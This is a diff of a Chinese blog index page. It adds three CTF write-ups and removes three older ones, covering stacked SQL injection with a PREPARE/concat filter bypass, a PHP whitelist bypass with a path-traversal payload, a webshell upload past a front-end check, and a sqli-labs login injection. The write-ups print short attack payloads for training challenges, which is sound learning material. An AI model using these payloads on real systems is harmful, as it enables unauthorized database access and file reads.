@@ -119,7 +119,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">43</span>
+          <span class="site-state-item-count">46</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -149,6 +149,239 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="王">
+      <meta itemprop="description" content="喵个咪">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SCP基金会中国分部驻406特别行动队">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="post-title-link" itemprop="url">强网杯2019随便注</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-04-16 20:05:55 / 修改时间：20:28:04" itemprop="dateCreated datePublished" datetime="2022-04-16T20:05:55+08:00">2022-04-16</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p><img src="https://s3.bmp.ovh/imgs/2022/04/16/f493090a9767bfbe.png"></p>
+<p>随便打了个select发现被过滤了这么多</p>
+<p>payload: 1’;show databases;</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/04/16/3e12cf659b442de9.png"></p>
+<p>发现敏感词</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/04/16/69752a4d4911c4b7.png"></p>
+<p>payload：1’;show tables from supersqli;</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/04/16/5c3d401800579343.png"></p>
+<p>发现flag 但是由于之前已经发现select被过滤 就要另寻他路</p>
+<p>这里我用预处理指令</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/04/16/c86175d998987939.png"></p>
+<p>payload: </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; PREPARE asd from concat(&#x27;sel&#x27;,&#x27;ect&#x27;, &#x27;* from `1919810931114514`&#x27;);EXECUTE asd;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.bmp.ovh/imgs/2022/04/16/5c1d3fc4e15ba5cf.png"></p>
+<p>完事</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/16/cat-dog/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="王">
+      <meta itemprop="description" content="喵个咪">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SCP基金会中国分部驻406特别行动队">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/16/cat-dog/" class="post-title-link" itemprop="url">cat==dog</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-04-16 19:28:25 / 修改时间：19:33:42" itemprop="dateCreated datePublished" datetime="2022-04-16T19:28:25+08:00">2022-04-16</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p> 代码审计？</p>
+<p>f12看到这样一串代码 这多是一件美事啊</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/04/16/05f95835b87d0d68.png"></p>
+<p>直接构造payload：/?cat=dog</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/04/16/3f0f1f688c4b036c.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/16/php%E5%AE%A1%E8%AE%A1%E5%88%9D%E5%AD%A6day1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="王">
+      <meta itemprop="description" content="喵个咪">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SCP基金会中国分部驻406特别行动队">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/16/php%E5%AE%A1%E8%AE%A1%E5%88%9D%E5%AD%A6day1/" class="post-title-link" itemprop="url">php审计初学day1</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-04-16 18:54:40 / 修改时间：19:33:23" itemprop="dateCreated datePublished" datetime="2022-04-16T18:54:40+08:00">2022-04-16</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>php代码审计真的是我的弱项(不如说是完全不会)</p>
+<h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><p>只讲审计 不讲别的了</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/04/16/17d9b8902cef63cc.png"></p>
+<p>$whitelist = [“source”=&gt;”source.php”,”hint”=&gt;”hint.php”]</p>
+<p>定义两个白名单</p>
+<p>isset()函数作用：检测变量是否已设置并且非 NULL</p>
+<p>这里用来检测变量是否未设置或为空</p>
+<p>is_string()函数判断变量是否是字符串</p>
+<p> if (in_array($page, $whitelist))判断传进变量是否在白名单内</p>
+<p>mb_substr(<br>        $page,<br>        0,<br>        mb_strpos($page . ‘?’, ‘?’)</p>
+<p>mb_substr(a,m,n)函数是对a进行截取，从m截取到n</p>
+<p>mb_strpos(abc,b)函数是返回b在abc中的位置，从0开始</p>
+<p>截取后的变量如果还在白名单中则可通过</p>
+<p><u>mb_strpos($page . ‘?’, ‘?’)中的.‘？’是将’？’添加在page变量后面。</u></p>
+<p>$_page = urldecode($page);<br>      $_page = mb_substr(<br>        $_page,<br>        0,<br>        mb_strpos($_page . ‘?’, ‘?’)<br>      );<br>      if (in_array($_page, $whitelist)) {<br>        return true;</p>
+<p>这里进行了一个url解码 解码后在白名单则返回true</p>
+<p>if (! empty($_REQUEST[‘file’])<br>    &amp;&amp; is_string($_REQUEST[‘file’])<br>    &amp;&amp; emmm::checkFile($_REQUEST[‘file’])<br>  ) {<br>    include $_REQUEST[‘file’];<br>    exit;</p>
+<p>很明了 必须满足三个条件为真才能返回flag</p>
+<p>payload：?file=hint.php?/../../../../../ffffllllaaaagggg</p>
+<p>../多次尝试 直到找到文件</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -665,233 +898,6 @@
 <p>翻译发现是俄语</p>
 <p><img src="https://s2.loli.net/2022/03/19/TdnCi7uovb2AmGe.png" alt="4.PNG"></p>
 <p>所以flag就是  HFCTF{apple_watermelon}</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/23/js-2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="王">
-      <meta itemprop="description" content="喵个咪">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="SCP基金会中国分部驻406特别行动队">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/02/23/js-2/" class="post-title-link" itemprop="url">js-2</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-02-23 20:12:05 / 修改时间：20:18:11" itemprop="dateCreated datePublished" datetime="2022-02-23T20:12:05+08:00">2022-02-23</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p><u>方法2</u>:</p>
-<p>浏览器内设置禁用js</p>
-<p><img src="https://s2.loli.net/2022/02/23/nWgeRGkjJEviXIr.png" alt="7.PNG"></p>
-<p><img src="https://s2.loli.net/2022/02/23/BsfRPQy82z6FM1q.png" alt="8.PNG"></p>
-<p>也可以成功上传</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/23/%E5%97%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="王">
-      <meta itemprop="description" content="喵个咪">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="SCP基金会中国分部驻406特别行动队">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/02/23/%E5%97%AF/" class="post-title-link" itemprop="url">嗯</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-02-23 20:05:47 / 修改时间：20:17:32" itemprop="dateCreated datePublished" datetime="2022-02-23T20:05:47+08:00">2022-02-23</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p><u><img src="https://s2.loli.net/2022/02/23/S9WCg3qxGTLiebJ.png" alt="1.PNG"></u></p>
-<p>文件上传 带js前端验证 </p>
-<p>先按照正常流程试着来一下</p>
-<p><img src="https://s2.loli.net/2022/02/23/KsuWoXDmZPQfzHd.png" alt="2.PNG"></p>
-<p>可以看到失败了 </p>
-<p>检查源代码发现</p>
-<p><img src="https://s2.loli.net/2022/02/23/X7mnoJEjWZAr4p8.png" alt="3.PNG"></p>
-<p>在这里js限制只能上传jpg png gif格式的文件</p>
-<p>方法1：</p>
-<p>利用burnsuite抓包修改</p>
-<p><img src="https://s2.loli.net/2022/02/23/tAlVRB9oaGMJYCZ.png" alt="4.PNG"></p>
-<p>先把木马文件改为jpg格式 骗过前端 再在这儿修改为php格式</p>
-<p><img src="https://s2.loli.net/2022/02/23/xlDaXUpkAImHnTV.png" alt="5.PNG"></p>
-<p>成功上传</p>
-<p><img src="https://s2.loli.net/2022/02/23/6GCgmZXOBY7ptof.png" alt="6.PNG"></p>
-<p>get</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/10/sql-lqb-11/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="王">
-      <meta itemprop="description" content="喵个咪">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="SCP基金会中国分部驻406特别行动队">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/02/10/sql-lqb-11/" class="post-title-link" itemprop="url">sql-lqb-11</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-02-10 15:12:52 / 修改时间：15:26:33" itemprop="dateCreated datePublished" datetime="2022-02-10T15:12:52+08:00">2022-02-10</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p><u>less-11</u></p>
-<p>人麻了 过完年脑子一片混乱ing</p>
-<p><img src="https://s2.loli.net/2022/02/10/4JMIVbzg9hdl65D.png" alt="捕获.PNG"></p>
-<p>第十一关开始进入登录框这种模式，通过post传递值，然后再将post的值写到sql语句中，按照这个想法，可以尝试一下万能密码：<br><img src="https://s2.loli.net/2022/02/10/Tgs52fIaMAiRmUK.png" alt="2.PNG"></p>
-<p><img src="https://s2.loli.net/2022/02/10/B9MpnNCm8ecDh4H.png" alt="3.PNG"></p>
-<p>可以看到和get类型一样的</p>
-<p><img src="https://s2.loli.net/2022/02/10/hkb7fRZgixSaNMI.png" alt="4.PNG"></p>
-<p>接着开搞 一步一步</p>
-<p><img src="https://s2.loli.net/2022/02/10/l5nrLIvXjiWHBAF.png" alt="5.PNG"></p>
-<p><img src="https://s2.loli.net/2022/02/10/mMyEpTPkOg5eQZd.png" alt="6.PNG"></p>
-<p><img src="https://s2.loli.net/2022/02/10/6cLm3EHZKRFowOJ.png" alt="7.PNG"></p>
-<img src="https://s2.loli.net/2022/02/10/w5XCpd7EcfxVuT8.png" alt="8.PNG" style="zoom:150%;" />
-
-<p>结束 </p>
 
       
     </div>
